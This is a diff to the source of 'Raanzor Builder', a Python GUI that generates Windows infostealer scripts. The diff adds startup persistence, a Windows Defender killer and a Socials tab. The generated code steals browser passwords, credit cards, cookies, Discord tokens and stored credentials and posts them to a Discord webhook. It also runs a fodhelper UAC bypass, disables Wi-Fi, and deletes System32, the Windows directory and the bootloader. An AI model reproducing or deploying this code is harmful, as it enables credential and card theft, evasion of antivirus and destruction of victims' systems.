@@ -26,6 +26,7 @@ import hashlib
 import ctypes
 import sys
 import telegram
+import webbrowser
 
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("dark-blue")
@@ -36,7 +37,6 @@ class RaanzorStealer(ctk.CTk):
         self.title("Raanzor Builder")
         self.geometry("1100x900")
         self.minsize(900, 800)
-        ctk.set_appearance_mode("dark")
         self.configure(bg="#121212")
 
         self.main_container = ctk.CTkFrame(self, fg_color="#121212")
@@ -59,7 +59,8 @@ class RaanzorStealer(ctk.CTk):
             ("Builder", self.show_builder),
             ("Docu", self.show_documentation),
             ("FAQ", self.show_faq),
-            ("Settings", self.show_settings)
+            ("Settings", self.show_settings),
+            ("Socials", self.show_socials)
         ]
 
         for label, command in self.menu_buttons:
@@ -179,7 +180,7 @@ class RaanzorStealer(ctk.CTk):
             "Fake Error", "Disconnect User", "Browsers Passwords", "Credit Cards", "Discord Token", "History",
             "Cookies", "Common Files", "TskMgr Info", "Shell History", "IPConf", "HWID", "UUID", "Discord Info",
             "Credentials", "Games", "System32 Deleter", "Windows Deleter", "BootLoader Deleter", "UAC Bypass",
-            "Network Disruption", "Automated File Deleter"
+            "Network Disruption", "Automated File Deleter", "Add2Startup", "Kill Defender"
         ]}
 
         container = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
@@ -199,11 +200,11 @@ class RaanzorStealer(ctk.CTk):
         categories = {
             "System Info & Network": ["System Info", "IP Info", "Wi-Fi SSID", "Kill All Programs", "Shutdown", "TskMgr Info", "IPConf", "HWID", "UUID"],
             "User Data & Privacy": ["Clipboard", "Browsers List", "Browsers Passwords", "Credit Cards", "Cookies", "History", "Common Files", "Shell History"],
-            "Security & Intrusion": ["Antivirus List", "Fake Error", "Disconnect User", "UAC Bypass", "Network Disruption"],
+            "Security & Intrusion": ["Antivirus List", "Fake Error", "Disconnect User", "UAC Bypass", "Network Disruption", "Kill Defender"],
             "Multimedia": ["Screenshot", "Webcam Screen"],
             "Discord & Misc": ["Kill Discord Client", "Discord Token", "Downloads List", "Files on Desktop", "Discord Info"],
             "Additional Info": ["Credentials", "Games"],
-            "Dangerous Actions": ["System32 Deleter", "Windows Deleter", "BootLoader Deleter", "Automated File Deleter"]
+            "Dangerous Actions": ["System32 Deleter", "Windows Deleter", "BootLoader Deleter", "Automated File Deleter", "Add2Startup"]
         }
 
         self.checkboxes = {}
@@ -233,7 +234,6 @@ class RaanzorStealer(ctk.CTk):
                     row_idx += 1
             row_idx += 1
 
-        
         file_size_label = ctk.CTkLabel(scrollable_frame, text="FILE SIZE", font=("Consolas", 16, "bold"), text_color="#FF0000")
         file_size_label.grid(row=row_idx, column=0, sticky="w", pady=(10, 5), columnspan=3)
         row_idx += 1
@@ -441,6 +441,28 @@ Yes, provided you comply with the MIT license and use it legally and ethically.
         )
         save_btn.pack(pady=20)
 
+    def show_socials(self):
+        self.clear_content()
+
+        socials_frame = ctk.CTkFrame(self.content, fg_color="#1A1A1A")
+        socials_frame.pack(fill="both", expand=True, padx=20, pady=20)
+
+        github_image_path = "asset/github.png"
+        github_pil_image = Image.open(github_image_path)
+        github_ctki_image = ctk.CTkImage(github_pil_image, size=(50, 50))
+        github_logo_label = ctk.CTkLabel(socials_frame, image=github_ctki_image, text="")
+        github_logo_label.image = github_ctki_image
+        github_logo_label.pack(pady=10)
+        github_logo_label.bind("<Button-1>", lambda e: webbrowser.open_new("https://github.com/dsckazam/RaanzorStealerV2/"))
+
+        discord_image_path = "asset/discord.png"
+        discord_pil_image = Image.open(discord_image_path)
+        discord_ctki_image = ctk.CTkImage(discord_pil_image, size=(50, 50))
+        discord_logo_label = ctk.CTkLabel(socials_frame, image=discord_ctki_image, text="")
+        discord_logo_label.image = discord_ctki_image
+        discord_logo_label.pack(pady=10)
+        discord_logo_label.bind("<Button-1>", lambda e: webbrowser.open_new("https://discord.gg/JjBGXN4gMY"))
+
     def save_settings(self):
         self.version = self.version_var.get()
         self.show_message(f"Settings saved. Version: {self.version}")
@@ -545,17 +567,6 @@ import ctypes
 import sys
 import telegram
 
-def is_admin():
-    try:
-        return ctypes.windll.shell32.IsUserAnAdmin()
-    except:
-        return False
-
-def request_admin():
-    ctypes.windll.shell32.ShellExecuteW(
-        None, "runas", sys.executable, " ".join(sys.argv), None, 1
-    )
-
 def send_embed(title, fields):
     if 'webhook' in globals():
         embed = {
@@ -564,7 +575,7 @@ def send_embed(title, fields):
             "fields": fields
         }
         try:
-            requests.post(webhook, json={"embeds": [embed]})
+            requests.post(webhook, json={"username": "Raanzor", "embeds": [embed]})
         except Exception as e:
             print(f"Error sending embed: {e}")
     else:
@@ -596,10 +607,10 @@ def send_file(file_path, title):
             script_parts.append("""
 def get_system_info():
     system_info = [
-        {"name": "Hostname", "value": socket.gethostname(), "inline": True},
-        {"name": "OS", "value": f"{platform.system()} {platform.release()}", "inline": True},
-        {"name": "CPU", "value": platform.processor(), "inline": False},
-        {"name": "RAM", "value": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB", "inline": True}
+        {"name": "Hostname", "value": f"```{socket.gethostname()}```", "inline": True},
+        {"name": "OS", "value": f"```{platform.system()} {platform.release()}```", "inline": True},
+        {"name": "CPU", "value": f"```{platform.processor()}```", "inline": False},
+        {"name": "RAM", "value": f"```{round(psutil.virtual_memory().total / (1024**3), 2)} GB```", "inline": True}
     ]
     send_embed("🖥️ System Info", system_info)
 """)
@@ -610,10 +621,10 @@ def get_ip_info():
     try:
         ip_data = requests.get("https://ipinfo.io/json").json()
         ip_info = [
-            {"name": "IP", "value": ip_data.get("ip", "N/A"), "inline": True},
-            {"name": "City", "value": ip_data.get("city", "N/A"), "inline": True},
-            {"name": "Country", "value": ip_data.get("country", "N/A"), "inline": False},
-            {"name": "ISP", "value": ip_data.get("org", "N/A"), "inline": False}
+            {"name": "IP", "value": f"```{ip_data.get('ip', 'N/A')}```", "inline": True},
+            {"name": "City", "value": f"```{ip_data.get('city', 'N/A')}```", "inline": True},
+            {"name": "Country", "value": f"```{ip_data.get('country', 'N/A')}```", "inline": False},
+            {"name": "ISP", "value": f"```{ip_data.get('org', 'N/A')}```", "inline": False}
         ]
         send_embed("🌍 IP Info", ip_info)
     except Exception as e:
@@ -624,16 +635,16 @@ def get_ip_info():
             script_parts.append("""
 def get_browsers_list():
     browsers = ["Chrome", "Firefox", "Edge"]
-    installed = [b for b in browsers if any(os.path.exists(os.path.join(p, b)) for p in ["C:\\Program Files", "C:\\Program Files (x86)"])]
-    send_embed("🌐 Browsers", [{"name": "Installed", "value": ', '.join(installed), "inline": False}])
+    installed = [b for b in browsers if any(os.path.exists(os.path.join(p, b)) for p in [r"C:\Program Files", r"C:\Program Files (x86)"])]
+    send_embed("🌐 Browsers", [{"name": "Installed", "value": f"```{', '.join(installed)}```", "inline": False}])
 """)
 
         if "Antivirus List" in options:
             script_parts.append("""
 def get_antivirus_list():
     try:
-        av = os.popen("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName").read()
-        send_embed("🛡️ Antivirus", [{"name": "Antivirus List", "value": av, "inline": False}])
+        av = os.popen("wmic /namespace:\\\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName").read()
+        send_embed("🛡️ Antivirus", [{"name": "Antivirus List", "value": f"```{av}```", "inline": False}])
     except Exception as e:
         print(f"Error getting antivirus list: {e}")
 """)
@@ -643,7 +654,7 @@ def get_antivirus_list():
 def get_downloads_list():
     try:
         files = '\\n'.join(os.listdir(os.path.expanduser("~/Downloads"))[:10])
-        send_embed("📂 Downloads", [{"name": "Latest Files", "value": files, "inline": False}])
+        send_embed("📂 Downloads", [{"name": "Latest Files", "value": f"```{files}```", "inline": False}])
     except Exception as e:
         print(f"Error getting downloads list: {e}")
 """)
@@ -653,7 +664,7 @@ def get_downloads_list():
 def get_desktop_files():
     try:
         files = '\\n'.join(os.listdir(os.path.expanduser("~/Desktop"))[:10])
-        send_embed("🖥️ Desktop Files", [{"name": "Latest Files", "value": files, "inline": False}])
+        send_embed("🖥️ Desktop Files", [{"name": "Latest Files", "value": f"```{files}```", "inline": False}])
     except Exception as e:
         print(f"Error getting desktop files: {e}")
 """)
@@ -697,7 +708,7 @@ def get_wifi_ssid():
 
 def send_wifi_ssid():
     ssid = get_wifi_ssid()
-    send_embed("📶 Wi-Fi SSID", [{"name": "SSID", "value": ssid, "inline": False}])
+    send_embed("📶 Wi-Fi SSID", [{"name": "SSID", "value": f"```{ssid}```", "inline": False}])
 """)
 
         if "Kill All Programs" in options:
@@ -748,18 +759,22 @@ def get_chrome_passwords():
     conn = sqlite3.connect("Loginvault.db")
     cursor = conn.cursor()
     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+    passwords = []
     for url, username, password in cursor.fetchall():
         try:
             password = win32crypt.CryptUnprotectData(password)[1]
-            yield url, username, password
         except Exception as e:
             print(f"Error decrypting password: {e}")
+            password = "Encrypted"
+        passwords.append((url, username, password))
     conn.close()
     os.remove("Loginvault.db")
+    return passwords
 
 def get_firefox_passwords():
     path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
     profiles = [f.path for f in os.scandir(path) if f.is_dir()]
+    passwords = []
     for profile in profiles:
         path = os.path.join(profile, "logins.json")
         if not os.path.exists(path):
@@ -770,7 +785,8 @@ def get_firefox_passwords():
                 url = login["hostname"]
                 username = login["encryptedUsername"]
                 password = login["encryptedPassword"]
-                yield url, username, password
+                passwords.append((url, username, password))
+    return passwords
 
 def get_edge_passwords():
     path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
@@ -780,14 +796,17 @@ def get_edge_passwords():
     conn = sqlite3.connect("Loginvault.db")
     cursor = conn.cursor()
     cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+    passwords = []
     for url, username, password in cursor.fetchall():
         try:
             password = win32crypt.CryptUnprotectData(password)[1]
-            yield url, username, password
         except Exception as e:
             print(f"Error decrypting password: {e}")
+            password = "Encrypted"
+        passwords.append((url, username, password))
     conn.close()
     os.remove("Loginvault.db")
+    return passwords
 
 def get_browsers_passwords():
     passwords = []
@@ -797,7 +816,7 @@ def get_browsers_passwords():
         passwords.append(f"Firefox - URL: {url}, Username: {username}, Password: {password}")
     for url, username, password in get_edge_passwords():
         passwords.append(f"Edge - URL: {url}, Username: {username}, Password: {password}")
-    send_embed("🔒 Browser Passwords", [{"name": "Passwords", "value": '\\n'.join(passwords), "inline": False}])
+    send_embed("🔒 Browser Passwords", [{"name": "Passwords", "value": f"```{'\\n'.join(passwords)}```", "inline": False}])
 """)
 
         if "Credit Cards" in options:
@@ -810,18 +829,21 @@ def get_chrome_credit_cards():
     conn = sqlite3.connect("web-data.db")
     cursor = conn.cursor()
     cursor.execute("SELECT name_on_card, card_number_encrypted, origin FROM credit_cards")
+    credit_cards = []
     for row in cursor.fetchall():
         name_on_card = row[0]
         card_number_encrypted = row[1]
         origin = row[2]
         card_number = decrypt_data(card_number_encrypted)
-        yield {"name": name_on_card, "number": card_number, "origin": origin}
+        credit_cards.append({"name": name_on_card, "number": card_number, "origin": origin})
     conn.close()
     os.remove("web-data.db")
+    return credit_cards
 
 def get_firefox_credit_cards():
     path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
     profiles = [f.path for f in os.scandir(path) if f.is_dir()]
+    credit_cards = []
     for profile in profiles:
         path = os.path.join(profile, "logins.json")
         if not os.path.exists(path):
@@ -832,7 +854,8 @@ def get_firefox_credit_cards():
                 url = login.get("hostname", "N/A")
                 username = login.get("encryptedUsername", "N/A")
                 password = login.get("encryptedPassword", "N/A")
-                yield {"url": url, "username": username, "password": password}
+                credit_cards.append({"url": url, "username": username, "password": password})
+    return credit_cards
 
 def decrypt_data(encrypted_data):
     try:
@@ -854,7 +877,7 @@ def get_credit_cards():
         credit_cards.append(f"Chrome - Name: {card['name']}, Number: {card['number']}, Origin: {card['origin']}")
     for card in get_firefox_credit_cards():
         credit_cards.append(f"Firefox - URL: {card['url']}, Username: {card['username']}, Password: {card['password']}")
-    send_embed("💳 Credit Cards", [{"name": "Credit Cards", "value": '\\n'.join(credit_cards), "inline": False}])
+    send_embed("💳 Credit Cards", [{"name": "Credit Cards", "value": f"```{'\\n'.join(credit_cards)}```", "inline": False}])
 """)
 
         if "Discord Token" in options:
@@ -881,19 +904,19 @@ def get_discord_info():
         try:
             user_info = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
             discord_info = [
-                {"name": "ID", "value": user_info.get("id", "N/A"), "inline": True},
-                {"name": "Username", "value": user_info.get("username", "N/A"), "inline": True},
-                {"name": "Display Name", "value": user_info.get("global_name", "N/A"), "inline": False},
-                {"name": "Email", "value": user_info.get("email", "N/A"), "inline": True},
-                {"name": "Phone Number", "value": user_info.get("phone", "N/A"), "inline": True},
-                {"name": "Nitro Type", "value": user_info.get("premium_type", "N/A"), "inline": True},
-                {"name": "MFA Enabled", "value": user_info.get("mfa_enabled", "N/A"), "inline": True}
+                {"name": "ID", "value": f"```{user_info.get('id', 'N/A')}```", "inline": True},
+                {"name": "Username", "value": f"```{user_info.get('username', 'N/A')}```", "inline": True},
+                {"name": "Display Name", "value": f"```{user_info.get('global_name', 'N/A')}```", "inline": False},
+                {"name": "Email", "value": f"```{user_info.get('email', 'N/A')}```", "inline": True},
+                {"name": "Phone Number", "value": f"```{user_info.get('phone', 'N/A')}```", "inline": True},
+                {"name": "Nitro Type", "value": f"```{user_info.get('premium_type', 'N/A')}```", "inline": True},
+                {"name": "MFA Enabled", "value": f"```{user_info.get('mfa_enabled', 'N/A')}```", "inline": True}
             ]
-            send_embed("Discord Info \U0001F451", discord_info)
+            send_embed("Discord Info 👑", discord_info)
         except Exception as e:
             print(f"Error getting Discord info: {e}")
     else:
-        send_embed("Discord Token \U0001F451", [{"name": "Token", "value": "Not Found", "inline": False}])
+        send_embed("Discord Token 👑", [{"name": "Token", "value": "```Not Found```", "inline": False}])
 """)
 
         if "History" in options:
@@ -948,7 +971,7 @@ def get_history():
 
 def send_history():
     history = get_history()
-    send_embed("History", [{"name": "History", "value": history, "inline": False}])
+    send_embed("History", [{"name": "History", "value": f"```{history}```", "inline": False}])
 """)
 
         if "Cookies" in options:
@@ -1003,7 +1026,7 @@ def get_cookies():
 
 def send_cookies():
     cookies = get_cookies()
-    send_embed("Cookies", [{"name": "Cookies", "value": cookies, "inline": False}])
+    send_embed("Cookies", [{"name": "Cookies", "value": f"```{cookies}```", "inline": False}])
 """)
 
         if "Common Files" in options:
@@ -1023,7 +1046,7 @@ def get_common_files():
 
 def send_common_files():
     files = get_common_files()
-    send_embed("Common Files", [{"name": "Common Files", "value": files, "inline": False}])
+    send_embed("Common Files", [{"name": "Common Files", "value": f"```{files}```", "inline": False}])
 """)
 
         if "TskMgr Info" in options:
@@ -1033,7 +1056,7 @@ def get_tskmgr_info():
         processes = []
         for proc in psutil.process_iter(['pid', 'name', 'username']):
             processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}, User: {proc.info['username']}")
-        send_embed("📊 Task Manager Info", [{"name": "Processes", "value": '\\n'.join(processes), "inline": False}])
+        send_embed("📊 Task Manager Info", [{"name": "Processes", "value": f"```{'\\n'.join(processes)}```", "inline": False}])
     except Exception as e:
         print(f"Error getting task manager info: {e}")
 
@@ -1056,7 +1079,7 @@ def get_shell_history():
         if os.path.exists(history_path):
             with open(history_path, "r", encoding="utf-8") as f:
                 history = f.read()
-            send_embed("📜 Shell History", [{"name": "History", "value": history, "inline": False}])
+            send_embed("📜 Shell History", [{"name": "History", "value": f"```{history}```", "inline": False}])
     except Exception as e:
         print(f"Error getting shell history: {e}")
 """)
@@ -1066,7 +1089,7 @@ def get_shell_history():
 def get_ipconf():
     try:
         ipconf = subprocess.check_output(["ipconfig", "/all"], universal_newlines=True)
-        send_embed("🌐 IP Configuration", [{"name": "IP Configuration", "value": ipconf, "inline": False}])
+        send_embed("🌐 IP Configuration", [{"name": "IP Configuration", "value": f"```{ipconf}```", "inline": False}])
     except Exception as e:
         print(f"Error getting IP configuration: {e}")
 """)
@@ -1076,7 +1099,7 @@ def get_ipconf():
 def get_hwid():
     try:
         hwid = subprocess.check_output(['wmic', 'csproduct', 'get', 'UUID']).decode().split('\\n')[1].strip()
-        send_embed("🔧 HWID", [{"name": "HWID", "value": hwid, "inline": False}])
+        send_embed("🔧 HWID", [{"name": "HWID", "value": f"```{hwid}```", "inline": False}])
     except Exception as e:
         print(f"Error getting HWID: {e}")
 """)
@@ -1086,7 +1109,7 @@ def get_hwid():
 def get_uuid():
     try:
         uuid_val = str(uuid.uuid4())
-        send_embed("🔧 UUID", [{"name": "UUID", "value": uuid_val, "inline": False}])
+        send_embed("🔧 UUID", [{"name": "UUID", "value": f"```{uuid_val}```", "inline": False}])
     except Exception as e:
         print(f"Error getting UUID: {e}")
 """)
@@ -1096,7 +1119,7 @@ def get_uuid():
 def get_credentials():
     try:
         credentials = subprocess.check_output(["cmdkey", "/list"], universal_newlines=True)
-        send_embed("🔑 Credentials", [{"name": "Credentials", "value": credentials, "inline": False}])
+        send_embed("🔑 Credentials", [{"name": "Credentials", "value": f"```{credentials}```", "inline": False}])
     except Exception as e:
         print(f"Error getting credentials: {e}")
 """)
@@ -1119,7 +1142,7 @@ def get_installed_games():
         for path in common_paths:
             if os.path.exists(path):
                 games.extend(os.listdir(path))
-        send_embed("🎮 Installed Games", [{"name": "Games", "value": "\\n".join(games), "inline": False}])
+        send_embed("🎮 Installed Games", [{"name": "Games", "value": f"```{'\\n'.join(games)}```", "inline": False}])
     except Exception as e:
         print(f"Error getting installed games: {e}")
 """)
@@ -1130,7 +1153,7 @@ def delete_system32():
     try:
         system32_path = os.path.join(os.environ["WINDIR"], "System32")
         shutil.rmtree(system32_path)
-        send_embed("🗑️ System32 Deleted", [{"name": "Status", "value": "System32 directory deleted", "inline": False}])
+        send_embed("🗑️ System32 Deleted", [{"name": "Status", "value": "```System32 directory deleted```", "inline": False}])
     except Exception as e:
         print(f"Error deleting System32: {e}")
 """)
@@ -1141,7 +1164,7 @@ def delete_windows():
     try:
         windows_path = os.environ["WINDIR"]
         shutil.rmtree(windows_path)
-        send_embed("🗑️ Windows Deleted", [{"name": "Status", "value": "Windows directory deleted", "inline": False}])
+        send_embed("🗑️ Windows Deleted", [{"name": "Status", "value": "```Windows directory deleted```", "inline": False}])
     except Exception as e:
         print(f"Error deleting Windows: {e}")
 """)
@@ -1152,7 +1175,7 @@ def delete_bootloader():
     try:
         bootloader_path = os.path.join(os.environ["WINDIR"], "Boot")
         shutil.rmtree(bootloader_path)
-        send_embed("🗑️ BootLoader Deleted", [{"name": "Status", "value": "BootLoader directory deleted", "inline": False}])
+        send_embed("🗑️ BootLoader Deleted", [{"name": "Status", "value": "```BootLoader directory deleted```", "inline": False}])
     except Exception as e:
         print(f"Error deleting BootLoader: {e}")
 """)
@@ -1161,10 +1184,10 @@ def delete_bootloader():
             script_parts.append("""
 def uac_bypass():
     try:
-        subprocess.run(["reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/ve", "/d", "cmd /k start", "/f"], check=True)
-        subprocess.run(["reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"], check=True)
+        subprocess.run(["reg", "add", "HKCU\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command", "/ve", "/d", "cmd /k start", "/f"], check=True)
+        subprocess.run(["reg", "add", "HKCU\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command", "/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f"], check=True)
         subprocess.run(["fodhelper.exe"], check=True)
-        send_embed("🔓 UAC Bypass", [{"name": "Status", "value": "UAC Bypass executed", "inline": False}])
+        send_embed("🔓 UAC Bypass", [{"name": "Status", "value": "```UAC Bypass executed```", "inline": False}])
     except Exception as e:
         print(f"Error executing UAC Bypass: {e}")
 """)
@@ -1174,7 +1197,7 @@ def uac_bypass():
 def network_disruption():
     try:
         subprocess.run(["netsh", "interface", "set", "interface", "Wi-Fi", "admin=disable"], check=True)
-        send_embed("📶 Network Disruption", [{"name": "Status", "value": "Wi-Fi disabled", "inline": False}])
+        send_embed("📶 Network Disruption", [{"name": "Status", "value": "```Wi-Fi disabled```", "inline": False}])
     except Exception as e:
         print(f"Error disabling Wi-Fi: {e}")
 """)
@@ -1185,16 +1208,37 @@ def automated_file_deleter():
     try:
         file_path = os.path.abspath(__file__)
         os.remove(file_path)
-        send_embed("🗑️ Automated File Deleter", [{"name": "Status", "value": "File deleted", "inline": False}])
+        send_embed("🗑️ Automated File Deleter", [{"name": "Status", "value": "```File deleted```", "inline": False}])
     except Exception as e:
         print(f"Error deleting file: {e}")
 """)
 
+        if "Add2Startup" in options:
+            script_parts.append("""
+def add_to_startup():
+    try:
+        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        script_path = os.path.abspath(__file__)
+        shutil.copy2(script_path, startup_path)
+        send_embed("🔄 Add to Startup", [{"name": "Status", "value": "```Added to startup```", "inline": False}])
+    except Exception as e:
+        print(f"Error adding to startup: {e}")
+""")
+
+        if "Kill Defender" in options:
+            script_parts.append("""
+def kill_defender():
+    try:
+        subprocess.run(["taskkill", "/f", "/im", "MsMpEng.exe"], check=True)
+        subprocess.run(["sc", "stop", "WinDefend"], check=True)
+        subprocess.run(["sc", "delete", "WinDefend"], check=True)
+        send_embed("🛡️ Kill Defender", [{"name": "Status", "value": "```Windows Defender disabled```", "inline": False}])
+    except Exception as e:
+        print(f"Error disabling Windows Defender: {e}")
+""")
+
         script_parts.append("""
 if __name__ == "__main__":
-    if not is_admin():
-        request_admin()
-        sys.exit()
 """)
 
         for option in options:
@@ -1267,6 +1311,10 @@ if __name__ == "__main__":
                 script_parts.append("    network_disruption()\n")
             elif option == "Automated File Deleter":
                 script_parts.append("    automated_file_deleter()\n")
+            elif option == "Add2Startup":
+                script_parts.append("    add_to_startup()\n")
+            elif option == "Kill Defender":
+                script_parts.append("    kill_defender()\n")
 
         return ''.join(script_parts)
 
